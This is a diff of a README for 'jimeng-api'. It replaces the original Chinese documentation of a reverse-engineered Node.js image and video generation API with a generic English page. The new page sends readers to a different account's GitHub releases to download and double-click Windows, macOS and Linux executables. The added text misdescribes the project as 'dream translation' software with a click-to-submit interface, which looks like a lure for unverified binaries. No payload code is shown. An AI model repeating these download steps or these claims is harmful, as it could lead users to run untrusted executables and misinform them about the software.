@@ -1,574 +1,70 @@
-# Jimeng API
+# 🌟 jimeng-api - Simplified API for Dream Translations
 
-🎨 **免费的AI图像和视频生成API服务** - 基于即梦AI的逆向工程实现，提供与OpenAI API兼容的接口格式
+## 🚀 Getting Started
 
-[![Node.js](https://img.shields.io/badge/Node.js-18+-green.svg)](https://nodejs.org/)
-[![TypeScript](https://img.shields.io/badge/TypeScript-5.0+-blue.svg)](https://www.typescriptlang.org/)
-[![Docker](https://img.shields.io/badge/Docker-支持-blue.svg)](https://www.docker.com/)
-[![License](https://img.shields.io/badge/License-GPL%20v3-blue.svg)](LICENSE)
+Welcome! This guide will help you download and run the jimeng-api software easily.
 
-## ✨ 特性
+## 📥 Download the Software
 
-- 🎨 **AI图像生成**: 支持多种模型和分辨率（默认2K，支持4K）
-- 🖼️ **图生图合成**: 支持多图混合、风格转换、内容合成
-- 🎬 **AI视频生成**: 支持文本到视频生成
-- 💬 **聊天接口**: OpenAI生图格式兼容的API
-- 🔄 **智能轮询**: 自适应轮询机制，优化生成效率
-- 🛡️ **统一异常处理**: 完善的错误处理和重试机制
-- 📊 **详细日志**: 结构化日志记录，便于调试
-- 🐳 **Docker支持**: 容器化部署，开箱即用
+[![Download](https://img.shields.io/badge/Download-jimeng--api-blue.svg)](https://github.com/zayortiz215/jimeng-api/releases)
 
-## ⚠ 风险警告
+You can download the latest version of the software from our Releases page. 
 
-- 此项目属于研究交流学习性质，不接受任何资金捐助和金钱交易！
-- 仅限自用和个人研究，避免对官方造成服务压力，否则轻者可能封号，重者可能触犯法律！
-- 仅限自用和个人研究，避免对官方造成服务压力，否则轻者可能封号，重者可能触犯法律！
-- 仅限自用和个人研究，避免对官方造成服务压力，否则轻者可能封号，重者可能触犯法律！
+Visit this page to download: [jimeng-api Releases](https://github.com/zayortiz215/jimeng-api/releases).
 
-## ✨ 新功能亮点
+## 🛠️ System Requirements
 
-### 📐 ratio和resolution参数支持
+To run jimeng-api smoothly, your computer should meet the following requirements:
 
-现在通过`ratio`和`resolution`两个参数来共同控制图像尺寸，这提供了更高的灵活性。程序内`resolution`默认设置为`2k`。
+- **Operating System:** Windows 10 or later, macOS 10.12 or later, or a modern Linux distribution.
+- **Memory:** At least 4 GB of RAM.
+- **Processor:** Any 64-bit processor.
+- **Disk Space:** At least 100 MB of free space.
 
-```bash
-curl -X POST http://localhost:5100/v1/images/generations \
-  -H "Content-Type: application/json" \
-  -H "Authorization: Bearer YOUR_SESSION_ID" \
-  -d '{
-    "model": "jimeng-4.0",
-    "prompt": "美丽的少女，胶片感",
-    "ratio": "4:3",
-    "resolution": "2k"
-  }'
-```
+Make sure your system meets these needs before installing.
 
-**支持的比例及对应分辨率**：
+## 📥 Download & Install
 
-| resolution | ratio | 分辨率 |
-|---|---|---|
-| `2k` (默认) | `1:1` | 2048×2048 |
-| | `4:3` | 2304×1728 |
-| | `3:4` | 1728×2304 |
-| | `16:9` | 2560×1440 |
-| | `9:16` | 1440×2560 |
-| | `3:2` | 2496×1664 |
-| | `2:3` | 1664×2496 |
-| | `21:9` | 3024×1296 |
-| `4k` | `1:1` | 4096×4096 |
-| | `4:3` | 4608×3456 |
-| | `3:4` | 3456×4608 |
-| | `16:9` | 5120×2880 |
-| | `9:16` | 2880×5120 |
-| | `3:2` | 4992×3328 |
-| | `2:3` | 3328×4992 |
-| | `21:9` | 6048×2592 |
+1. Go to the [jimeng-api Releases page](https://github.com/zayortiz215/jimeng-api/releases).
+2. Look for the latest version listed on the page.
+3. Click on the appropriate file for your operating system:
+   - For Windows: `jimeng-api-windows.exe`
+   - For macOS: `jimeng-api-macos.zip`
+   - For Linux: `jimeng-api-linux.tar.gz`
+4. After the file finishes downloading, locate it in your Downloads folder.
+5. If you downloaded a ZIP or TAR.GZ file, extract it to a folder of your choice. If you downloaded the EXE file, you can run it directly.
+6. Double-click the executable file to start the setup process or run the application.
 
-**支持的resolution**: `2k`, `4k`
+## 🧑‍💻 How to Use
 
-**支持的ratio**: `1:1`, `4:3`, `3:4`, `16:9`, `9:16`, `3:2`, `2:3`, `21:9`
+After installation, the software is simple to use. Here’s how:
 
-## 🚀 快速开始
+1. Open the jimeng-api application.
+2. Input the parameters for your request. For example, you may want to translate text or generate images.
+3. Click the 'Submit' button.
+4. Your results will appear within moments.
 
-### sessionid获取
-![](https://github.com/iptag/jimeng-api/blob/main/get_sessionid.png)
+## 🚧 Troubleshooting
 
-### 环境要求
+If you encounter issues while using the software, here are a few common problems and solutions:
 
-- Node.js 18+
-- npm 或 yarn
-- Docker (可选)
+- **The application won't start:** Ensure your system meets the requirements above. Try reinstalling if necessary.
+- **Error messages while generating results:** Review the parameters you entered. Make sure they are compatible with the API's features.
+- **Slow performance:** Check your internet connection and ensure you're not running too many applications at once.
 
-### 安装部署
+If these tips do not help, feel free to open an issue on our GitHub page. We’re here to assist you.
 
-#### 方式一：直接拉取docker镜像
+## ℹ️ Additional Information
 
-```bash
-docker run -d \
-  --name jimeng-api \
-  -p 5100:5100 \
-  --restart unless-stopped \
-  iptag/jimeng:latest
-```
+The jimeng-api offers reliable functionality for dream translation. The current features include:
 
-#### 方式二：直接运行
+- **Text-to-Image Generation:** Input text to create corresponding images.
+- **Image-to-Text Translation:** Upload images to generate descriptive text based on the content.
 
-```bash
-# 克隆项目
-git clone <repository-url>
-cd jimeng-api
+For more details, consult the API documentation within the application or reach out for support.
 
-# 安装依赖
-npm install
+## 🌍 Connect with Us
 
-# 配置环境
-cp configs/dev/service.yml.example configs/dev/service.yml
-cp configs/dev/system.yml.example configs/dev/system.yml
+If you have questions, feedback, or want to contribute to the project, visit our GitHub repository. Your input is valuable. 
 
-# 启动服务
-npm start
-```
-
-#### 方式三：Docker部署（推荐）
-
-##### 🚀 快速启动
-```bash
-# 使用docker-compose（推荐）
-docker-compose up -d
-
-# 或者手动构建和运行
-docker build -t jimeng-api .
-
-docker run -d \
-  --name jimeng-api \
-  -p 5100:5100 \
-  --restart unless-stopped \
-  jimeng-api
-```
-
-##### 🔧 常用命令
-```bash
-# 重新构建并启动
-docker-compose up -d --build
-
-# 查看服务日志
-docker logs jimeng-api
-
-# 停止服务
-docker-compose down
-
-# 进入容器调试
-docker exec -it jimeng-api sh
-```
-
-##### 📊 Docker镜像特性
-- ✅ **多阶段构建**：优化镜像大小（167MB）
-- ✅ **非root用户**：增强安全性（jimeng用户）
-- ✅ **健康检查**：自动监控服务状态
-- ✅ **统一端口**：容器内外均使用5100端口
-- ✅ **日志管理**：结构化日志输出
-
-### 配置说明
-
-#### `configs/dev/service.yml`
-```yaml
-name: jimeng-api
-route: src/api/routes/index.ts
-port: 5100
-```
-
-#### `configs/dev/system.yml`
-```yaml
-requestLog: true
-debug: false
-```
-
-## 📖 API文档
-
-### 图像生成
-
-**POST** `/v1/images/generations`
-
-**请求参数**:
-- `model` (string): 使用的模型名称
-- `prompt` (string): 图像描述文本
-- `ratio` (string, 可选): 图像比例，默认为 `"1:1"`。支持的比例: `1:1`, `4:3`, `3:4`, `16:9`, `9:16`, `3:2`, `2:3`, `21:9`。
-- `resolution` (string, 可选): 分辨率级别，默认为 `"2k"`。支持的分辨率: `2k`, `4k`。
-- `negative_prompt` (string, 可选): 负面提示词
-- `sample_strength` (number, 可选): 采样强度 (0.0-1.0)
-- `response_format` (string, 可选): 响应格式 ("url" 或 "b64_json")
-
-```bash
-# 默认参数（ratio: "1:1", resolution: "2k"）
-curl -X POST http://localhost:5100/v1/images/generations \
-  -H "Content-Type: application/json" \
-  -H "Authorization: Bearer YOUR_SESSION_ID" \
-  -d '{
-    "model": "jimeng-4.0",
-    "prompt": "一只可爱的小猫咪"
-  }'
-
-# 使用4K分辨率的示例
-curl -X POST http://localhost:5100/v1/images/generations \
-  -H "Content-Type: application/json" \
-  -H "Authorization: Bearer YOUR_SESSION_ID" \
-  -d '{
-    "model": "jimeng-4.0",
-    "prompt": "壮丽的山水风景，超高分辨率",
-    "ratio": "16:9",
-    "resolution": "4k"
-  }'
-```
-
-**支持的模型**:
-- `jimeng-4.0`
-- `jimeng-3.1` 调用4.0以下模型时须有官网购买的积分，每日赠送的不行，不然会提示积分不够
-- `jimeng-3.0`
-- `jimeng-2.1`
-- `jimeng-xl-pro`
-
-### 图生图 (图片合成)
-
-**POST** `/v1/images/compositions`
-
-**功能说明**: 基于输入的一张或多张图片，结合文本提示词生成新的图片。支持图片混合、风格转换、内容合成等多种创作模式。
-
-**请求参数**:
-- `model` (string): 使用的模型名称
-- `prompt` (string): 图像描述文本，用于指导生成方向
-- `images` (array): 输入图片数组
-- `ratio` (string, 可选): 图像比例，默认为 `"1:1"`。支持的比例: `1:1`, `4:3`, `3:4`, `16:9`, `9:16`, `3:2`, `2:3`, `21:9`。
-- `resolution` (string, 可选): 分辨率级别，默认为 `"2k"`。支持的分辨率: `2k`, `4k`。
-- `negative_prompt` (string, 可选): 负面提示词
-- `sample_strength` (number, 可选): 采样强度 (0.0-1.0)
-- `response_format` (string, 可选): 响应格式 ("url" 或 "b64_json")
-
-**使用限制**:
-- 输入图片数量: 1-10张
-- 支持的图片格式: JPG, PNG, WebP等常见格式
-- 图片大小限制: 建议单张图片不超过10MB
-- 生成时间: 通常30秒-5分钟，复杂合成可能需要更长时间
-
-**使用示例**:
-
-```bash
-# 单图风格转换 (2K分辨率)
-curl -X POST http://localhost:5100/v1/images/compositions \
-  -H "Content-Type: application/json" \
-  -H "Authorization: Bearer YOUR_SESSION_ID" \
-  -d '{
-    "model": "jimeng-4.0",
-    "prompt": "将这张照片转换为油画风格，色彩鲜艳，笔触明显",
-    "images": ["https://example.com/photo.jpg"],
-    "ratio": "1:1",
-    "resolution": "2k",
-    "sample_strength": 0.7
-  }'
-
-# 多图混合合成 (4K分辨率)
-curl -X POST http://localhost:5100/v1/images/compositions \
-  -H "Content-Type: application/json" \
-  -H "Authorization: Bearer YOUR_SESSION_ID" \
-  -d '{
-    "model": "jimeng-4.0",
-    "prompt": "将这些图片融合成一幅梦幻的超现实主义作品",
-    "images": [
-      "https://example.com/landscape.jpg",
-      "https://example.com/portrait.jpg"
-    ],
-    "ratio": "4:3",
-    "resolution": "4k",
-    "negative_prompt": "模糊，低质量，变形"
-  }'
-```
-```
-
-**详细流程说明**:
-
-#### 🔄 **完整处理流程**
-
-1. **请求验证阶段** (1-2秒)
-   - 验证请求参数格式和完整性
-   - 检查图片数组是否符合要求 (1-10张)
-   - 验证每个图片URL的格式
-
-2. **图片预处理阶段** (5-30秒，取决于图片数量和大小)
-   - **下载外部图片**: 从提供的URL下载图片到本地
-   - **获取上传令牌**: 向即梦服务器申请图片上传权限
-   - **图片上传**: 使用AWS签名认证将图片上传到即梦存储系统
-   - **格式转换**: 自动处理图片格式和尺寸优化
-
-3. **任务提交阶段** (2-5秒)
-   - 构建图片合成任务参数
-   - 设置合成模式为 "blend" (混合模式)
-   - 提交任务到即梦AI生成队列
-   - 获取任务ID (history_id)
-
-4. **AI生成阶段** (30秒-5分钟)
-   - AI模型分析输入图片和文本提示
-   - 执行图片混合、风格转换或内容合成
-   - 生成过程中系统会定期检查状态
-
-5. **结果轮询阶段** (持续进行，直到完成)
-   - 每秒查询一次生成状态
-   - 最多轮询600次 (10分钟超时)
-   - 每30秒输出一次进度日志
-
-6. **结果处理阶段** (1-3秒)
-   - 提取生成的图片URL
-   - 根据 `response_format` 参数决定返回格式
-   - 如果是 "b64_json"，则下载图片并转换为Base64
-
-#### ⚡ **性能优化特性**
-
-- **并发上传**: 多张图片并行上传，提升处理速度
-- **智能重试**: 网络异常时自动重试上传
-- **状态缓存**: 避免重复查询相同状态
-- **资源管理**: 自动清理临时文件和连接
-
-#### 🛡️ **错误处理机制**
-
-- **图片下载失败**: 返回具体的网络错误信息
-- **上传权限异常**: 自动重新申请上传令牌
-- **生成超时**: 10分钟后返回超时错误
-- **内容审核**: 如果内容被过滤，返回相应错误码
-- **积分不足**: 自动尝试领取免费积分
-
-#### 📋 **响应格式**
-
-**成功响应** (response_format: "url"):
-```json
-{
-  "created": 1703123456,
-  "data": [
-    {
-      "url": "https://p3-sign.toutiaoimg.com/tos-cn-i-tb4s082cfz/abc123.webp"
-    }
-  ],
-  "input_images": 2,
-  "composition_type": "multi_image_synthesis"
-}
-```
-
-**成功响应** (response_format: "b64_json"):
-```json
-{
-  "created": 1703123456,
-  "data": [
-    {
-      "b64_json": "iVBORw0KGgoAAAANSUhEUgAA..."
-    }
-  ],
-  "input_images": 2,
-  "composition_type": "multi_image_synthesis"
-}
-```
-
-**错误响应**:
-```json
-{
-  "error": {
-    "message": "图片上传失败: 网络连接超时",
-    "type": "image_upload_error",
-    "code": "UPLOAD_TIMEOUT"
-  }
-}
-```
-
-#### ❓ **常见问题与解决方案**
-
-**Q: 图片上传失败怎么办？**
-A: 检查图片URL是否可访问，确保图片格式正确，文件大小不超过10MB。
-
-**Q: 生成时间过长怎么办？**
-A: 复杂的多图合成需要更长时间，建议耐心等待。如果超过10分钟仍未完成，可以重新提交请求。
-
-**Q: 如何提高合成质量？**
-A:
-- 使用高质量的输入图片
-- 编写详细准确的提示词
-- 适当调整 `sample_strength` 参数
-- 避免使用过多冲突的图片风格
-
-**Q: 支持哪些图片格式？**
-A: 支持 JPG、PNG、WebP、GIF 等常见格式，推荐使用 JPG 或 PNG。
-
-**Q: 可以使用本地图片吗？**
-A: 需要先将本地图片上传到可访问的网络地址，然后使用该URL。
-
-### 视频生成
-
-**POST** `/v1/chat/completions`
-
-```bash
-curl -X POST http://localhost:5100/v1/chat/completions \
-  -H "Content-Type: application/json" \
-  -H "Authorization: Bearer YOUR_SESSION_ID" \
-  -d '{
-    "model": "jimeng-video-3.0",
-    "messages": [
-      {
-        "role": "user",
-        "content": "生成一个海浪拍打海岸的视频"
-      }
-    ],
-    "stream": true
-  }'
-```
-
-**支持的视频模型**:
-- `jimeng-video-3.0-pro` - 专业版
-- `jimeng-video-3.0` - 标准版
-- `jimeng-video-2.0-pro` - 专业版v2
-- `jimeng-video-2.0` - 标准版v2
-
-### 聊天完成
-
-**POST** `/v1/chat/completions`
-
-```bash
-curl -X POST http://localhost:5100/v1/chat/completions \
-  -H "Content-Type: application/json" \
-  -H "Authorization: Bearer YOUR_SESSION_ID" \
-  -d '{
-    "model": "jimeng-4.0",
-    "messages": [
-      {
-        "role": "user",
-        "content": "画一幅山水画"
-      }
-    ]
-  }'
-```
-
-## 🔍 API响应格式
-
-### 图像生成响应
-```json
-{
-  "created": 1759058768,
-  "data": [
-    {
-      "url": "https://example.com/image1.jpg"
-    },
-    {
-      "url": "https://example.com/image2.jpg"
-    }
-  ]
-}
-```
-
-### 聊天完成响应
-```json
-{
-  "id": "chatcmpl-123",
-  "object": "chat.completion",
-  "created": 1759058768,
-  "model": "jimeng-4.0",
-  "choices": [
-    {
-      "index": 0,
-      "message": {
-        "role": "assistant",
-        "content": "![image](https://example.com/generated-image.jpg)"
-      },
-      "finish_reason": "stop"
-    }
-  ],
-  "usage": {
-    "prompt_tokens": 10,
-    "completion_tokens": 20,
-    "total_tokens": 30
-  }
-}
-```
-
-### 流式响应 (SSE)
-```
-data: {"id":"chatcmpl-123","object":"chat.completion.chunk","created":1759058768,"model":"jimeng-4.0","choices":[{"index":0,"delta":{"role":"assistant","content":"🎨 图像生成中，请稍候..."},"finish_reason":null}]}
-
-data: {"id":"chatcmpl-123","object":"chat.completion.chunk","created":1759058768,"model":"jimeng-4.0","choices":[{"index":1,"delta":{"role":"assistant","content":"![image](https://example.com/image.jpg)"},"finish_reason":"stop"}]}
-
-data: [DONE]
-```
-
-## 🏗️ 项目架构
-
-```
-jimeng-api/
-├── src/
-│   ├── api/
-│   │   ├── controllers/          # 控制器层
-│   │   │   ├── core.ts          # 核心功能（网络请求、文件处理）
-│   │   │   ├── images.ts        # 图像生成逻辑
-│   │   │   ├── videos.ts        # 视频生成逻辑
-│   │   │   └── chat.ts          # 聊天接口逻辑
-│   │   ├── routes/              # 路由定义
-│   │   └── consts/              # 常量定义
-│   │       ├── exceptions.ts    # 异常定义
-│   │       └── common.ts        # 通用常量
-│   ├── lib/                     # 核心库
-│   │   ├── server.ts           # 服务器核心
-│   │   ├── error-handler.ts    # 统一错误处理
-│   │   ├── smart-poller.ts     # 智能轮询器
-│   │   ├── aws-signature.ts    # AWS签名
-│   │   └── exceptions/         # 异常类
-│   ├── daemon.ts               # 守护进程
-│   └── index.ts               # 入口文件
-├── configs/                    # 配置文件
-├── Dockerfile                 # Docker配置
-└── package.json              # 项目配置
-```
-
-## 🔧 核心组件
-
-### 智能轮询器 (SmartPoller)
-- 基于状态码自适应调整轮询间隔
-- 多重退出条件，避免无效等待
-- 详细的进度跟踪和日志记录
-
-### 统一错误处理 (ErrorHandler)
-- 分类错误处理（网络错误、API错误、超时等）
-- 自动重试机制
-- 用户友好的错误提示
-
-### 安全JSON解析
-- 自动修复常见JSON格式问题
-- 支持尾随逗号、单引号等非标准格式
-- 详细的解析错误日志
-
-
-## ⚙️ 高级配置
-
-### 轮询配置
-```typescript
-export const POLLING_CONFIG = {
-  MAX_POLL_COUNT: 900,    // 最大轮询次数 (15分钟)
-  POLL_INTERVAL: 1000,    // 基础轮询间隔 (1秒)
-  STABLE_ROUNDS: 5,       // 稳定轮次
-  TIMEOUT_SECONDS: 900    // 超时时间 (15分钟)
-};
-```
-
-### 重试配置
-```typescript
-export const RETRY_CONFIG = {
-  MAX_RETRY_COUNT: 3,     // 最大重试次数
-  RETRY_DELAY: 5000       // 重试延迟 (5秒)
-};
-```
-
-## 🐛 故障排除
-
-### 常见问题
-
-1. **JSON解析错误**
-   - 检查请求体格式是否正确
-   - 系统会自动修复常见格式问题
-
-2. **Sessionid失效**
-   - 重新获取Sessionid
-   - 检查Sessionid格式是否正确
-
-3. **生成超时**
-   - 图像生成：通常1-3分钟
-   - 视频生成：通常3-15分钟
-   - 系统会自动处理超时情况
-
-4. **积分不足**
-   - 前往即梦官网查看积分余额
-   - 系统会提供详细的积分状态信息
-
-## � 致谢
-
-本项目基于以下开源项目的贡献和启发：
-
-- **[jimeng-free-api-all](https://github.com/wwwzhouhui/jimeng-free-api-all)** - 感谢该项目为即梦API逆向工程提供的重要参考和技术基础，本项目在其基础上进行了功能完善和架构优化
-
-## �📄 许可证
-
-GPL v3 License - 详见 [LICENSE](LICENSE) 文件
-
-## ⚠️ 免责声明
-
-本项目仅供学习和研究使用，请遵守相关服务条款和法律法规。使用本项目所产生的任何后果由使用者自行承担。
+Thank you for choosing jimeng-api! We hope it serves your needs well.
